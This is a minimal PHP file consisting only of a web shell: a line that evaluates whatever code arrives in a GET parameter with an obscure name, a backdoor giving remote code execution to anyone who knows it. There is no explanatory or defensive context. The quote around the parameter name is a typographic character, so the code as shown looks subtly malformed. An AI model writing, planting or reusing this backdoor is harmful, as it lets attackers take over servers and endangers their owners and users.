<?php
eval($_GET[’tZorhKDF']);
?>
